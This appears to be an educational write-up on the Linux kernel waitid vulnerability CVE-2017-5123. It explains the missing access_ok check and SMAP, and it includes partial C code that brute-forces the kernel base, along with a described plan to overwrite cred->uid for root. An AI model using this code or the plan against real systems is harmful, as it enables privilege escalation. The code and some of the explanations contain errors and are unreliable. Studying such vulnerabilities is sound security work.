# CVE-2017-5123

**CVE-2017-5123** is a vulnerability in the waitid syscall implementation which allows writes (limited writes only 0 can be written anywhere in memory) to memory address specified by user without checking if they are kernel addresses or userland addresses.


## Understanding the Vulnerability.

File : `kernel/exit.c`

```C
SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
		infop, int, options, struct rusage __user *, ru)
{
	struct rusage r;
	struct waitid_info info = {.status = 0};
	long err = kernel_waitid(which, upid, &info, options, ru ? &r : NULL);
	int signo = 0;

	if (err > 0) {
		signo = SIGCHLD;
		err = 0;
		if (ru && copy_to_user(ru, &r, sizeof(struct rusage)))
			return -EFAULT;
	}
	if (!infop)
		return err;

	user_access_begin();
	unsafe_put_user(signo, &infop->si_signo, Efault);             /*  All the unsafe_put_user() calls should tingle your spidy senses  */ 
	unsafe_put_user(0, &infop->si_errno, Efault);                            
	unsafe_put_user(info.cause, &infop->si_code, Efault);         
	unsafe_put_user(info.pid, &infop->si_pid, Efault);             
	unsafe_put_user(info.uid, &infop->si_uid, Efault);              
	unsafe_put_user(info.status, &infop->si_status, Efault);
	user_access_end();
	return err;                                                         
Efault:
	user_access_end();
	return -EFAULT;
}
```

lets look at the unsafe_put_user() function  

File: `include/linux/uaccess.h`

```C

/*
 * The "unsafe" user accesses aren't really "unsafe", but the naming
 * is a big fat warning: you have to not only do the access_ok()
 * checking before using them, but you have to surround them with the
 * user_access_begin/end() pair.
 */
#define user_access_begin()	__uaccess_begin()
#define user_access_end()	__uaccess_end()

#define unsafe_put_user(x, ptr, err_label)					\
do {										\
	int __pu_err;								\
	__typeof__(*(ptr)) __pu_val = (x);					\
	__put_user_size(__pu_val, (ptr), sizeof(*(ptr)), __pu_err, -EFAULT);	\
	if (unlikely(__pu_err)) goto err_label;					\
} while (0)

#define unsafe_get_user(x, ptr, err_label)					\
do {										\
	int __gu_err;								\
	__inttype(*(ptr)) __gu_val;						\
	__get_user_size(__gu_val, (ptr), sizeof(*(ptr)), __gu_err, -EFAULT);	\
	(x) = (__force __typeof__(*(ptr)))__gu_val;				\
	if (unlikely(__gu_err)) goto err_label;					\
} while (0)

#endif /* _ASM_X86_UACCESS_H */ss
```
unsafe_put_user() macro will just write a value to the pointer specified by ptr


Oh look! Somebody wrote a comment it says that we need to surround unsafe_put_user() with user_access_begin/end() pair and also perform access_ok() lets take a look at these functions .

```C
#define __uaccess_begin() stac()
#define __uaccess_end()   clac()
```
the __uaccess_begin() and __uaccess_end() are just wrapper macros for stac and clac assembly instructions

**stac** : Sets the AC flag bit in EFLAGS register. This may enable alignment checking of user-mode data accesses. This allows explicit supervisor-mode data accesses to user-mode pages even if the SMAP bit is set in the CR4 register.

[more about stac instruction ](https://www.felixcloutier.com/x86/stac)

**clac** : Clears the AC flag bit in EFLAGS register. This disables any alignment checking of user-mode data accesses. If the SMAP bit is set in the CR4 register, this disallows explicit supervisor-mode data accesses to user-mode pages.

[more about clac instruction ](https://www.felixcloutier.com/x86/clac)

__uaccess_begin() and __uaccess_end() basically disable and enable SMAP for userland access respectively.


```C
/**
 * access_ok: - Checks if a user space pointer is valid
 .
 .
 .
 **/
    #define access_ok(type, addr, size)					\
({									\
	WARN_ON_IN_IRQ();						\
	likely(!__range_not_ok(addr, size, user_addr_max()));		\
})

```
the access_ok() macro just checks if a pointer is a valid userland pointer and EFAULTs if otherwise.

## SMAP

Previously we talked about the stac and clac instruction which can disable and enable SMAP...     

so what is SMAP?
***SMAP*** stands for Supervisor Mode Access Protection it marks userland pages as non-readable.

so in order to write to userland pages we need to disable SMAP . the *slac()* and *clac()* functions do exactly that.

slac() - disables SMAP          
clac() - enables SMAP


## Exploit Strategy - 1

This bug is a very simple bug but exploitation for this bug is not that trivial according to my understanding there aren't any obvious paths for exploitation after looking at [this](https://salls.github.io/Linux-Kernel-CVE-2017-5123/) article by salls. i looked at a couple of strageties and i decided to go with a different approach similar to the one described in [this](https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/) article here.

In this exploit strategy we try to find the kernel address by bruteforcing available memory addresses by writing 0x0 to random addresses and checking if we return a `EFAULT` because when we write to a invalid pointer we return a `EFAULT` but the kernel doesn't panic.... we can use this to find the base of the kernel like so:

```C
# exp.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main(){

pid_t pid;
unsigned long i ;
for(i = (char *)0xffff880000000000; ; i+=0x10000000) {
    pid = fork();
    if (pid > 0) 
    {
        if(syscall(247, P_PID, pid, (siginfo_t *)i, WEXITED, NULL) >= 0)  # 247 is the waitid syscall number . 
        {
            printf("Base found at :0x%p\n", i);

        }    
    }
}

return 0;
}
```

After Bruteforcing KASLR we can try and create a lot of processes and try to overwrite the cred->uid of that process to `0` which will give us root privileges .....


***An Important thing to note here is that we need to pin our program to 1 CPU so that all the threads are in the same cpu-cache...***


